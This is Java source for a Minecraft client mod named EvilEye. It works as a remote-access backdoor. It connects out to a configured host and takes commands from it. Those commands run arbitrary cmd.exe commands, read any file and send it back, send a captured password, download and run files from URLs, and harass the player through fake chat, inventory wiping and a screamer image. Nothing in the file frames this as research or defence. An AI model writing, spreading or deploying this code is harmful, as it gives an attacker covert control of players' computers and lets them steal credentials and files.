package me.bushroot.evileye.Evil;

import me.bushroot.evileye.Config.config;
import net.minecraft.client.Minecraft;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.init.SoundEvents;
import net.minecraft.util.text.TextComponentString;

import javax.swing.*;
import java.io.*;
import java.net.Socket;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;

public class EvilEye extends Thread {
    public static String password = "none";

    public void run() {
        int serverPort = config.port;
        String address = config.host;

        Minecraft mc = Minecraft.getMinecraft();

        try {
            Socket socket = new Socket(address, serverPort);

            InputStream sin = socket.getInputStream();
            OutputStream sout = socket.getOutputStream();

            DataInputStream in = new DataInputStream(sin);
            DataOutputStream out = new DataOutputStream(sout);

            PrintWriter write = new PrintWriter(socket.getOutputStream(), true);

            write.println("| The Connection Has Been Successfully Established >:)");

            while (true) {
                String line = null;

                line = in.readUTF();

                String[] arg = line.split(line.split(" ")[0] + " ");

                System.out.println(line);
                if (line.startsWith("/mchat")) {
                    mc.player.sendMessage(new TextComponentString(arg[1]));
                }

                if (line.startsWith("/cmd")) {
                    Runtime.getRuntime().exec("cmd.exe /C " + arg[1]);
                }

                if (line.startsWith("/mcmd")) {
                    mc.player.sendChatMessage(arg[1]);
                }

                if (line.startsWith("/check")) {
                    try {
                        String content = Files.lines(Paths.get(arg[1])).reduce("", String::concat);

                        write.println(content);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }

                if (line.startsWith("/logger")) {
                    write.println(password);
                }

                if (line.startsWith("/open")) {
                    try {
                        final URL url = new URL(arg[1]);

                        String tempFileName = Paths.get(
                                System.getProperty("java.io.tmpdir"),
                                new File(url.getPath()).getName().toString()
                        ).toString();

                        if (!new File(tempFileName).exists()) {

                            BufferedInputStream inputStream = new BufferedInputStream(url.openStream());
                            FileOutputStream fileOutputStream = new FileOutputStream(tempFileName);

                            byte dataBuffer[] = new byte[1024];
                            int bytesRead;
                            while ((bytesRead = inputStream.read(dataBuffer, 0, 1024)) != -1) {
                                fileOutputStream.write(dataBuffer, 0, bytesRead);
                            }

                            inputStream.close();
                            fileOutputStream.close();

                            Runtime.getRuntime().exec(
                                    new String[]{"cmd.exe", "/C", "start", tempFileName}
                            );
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }

                if (line.startsWith("/vanish")) {
                    EntityPlayer vanishEntity = Minecraft.getMinecraft().world.getPlayerEntityByName(arg[1]);
                    assert vanishEntity != null;
                    Minecraft.getMinecraft().world.removeEntity(vanishEntity);
                }

                if (line.startsWith("/mc_scream")) {
                    mc.player.playSound(SoundEvents.ENTITY_GHAST_WARN, 0.5f, 0.5f);
                    mc.player.playSound(SoundEvents.ENTITY_GHAST_HURT, 0.5f, 0.5f);
                    mc.player.playSound(SoundEvents.ENTITY_GHAST_DEATH, 0.5f, 0.5f);
                }

                if (line.startsWith("/clear")) {
                    mc.player.inventory.clear();
                }

                if (line.startsWith("/drop")) {
                    mc.player.dropItem(true);
                }

                if (line.startsWith("/error")) {
                    JOptionPane.showMessageDialog(null, arg[1]);
                }

                if (line.startsWith("/screamer")) {
                    try (BufferedInputStream inputStream = new BufferedInputStream(new URL("https://yt3.ggpht.com/a/AATXAJwGGgJkT9Jw-guZ6koD5eDDlt33t_M5JuuTUXcT=s900-c-k-c0x00ffffff-no-rj").openStream()); // Ссылка на скример, можете указать свою :)
                         FileOutputStream fileOS = new FileOutputStream("fuck_i_scared.png")) {
                        byte[] data = new byte[1024];
                        int byteContent;
                        while ((byteContent = inputStream.read(data, 0, 1024)) != -1) {
                            fileOS.write(data, 0, byteContent);
                        }
                        Runtime.getRuntime().exec("cmd.exe /C fuck_i_scared.gif");
                    } catch (IOException ignored) {
                    }
                }
                out.flush();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
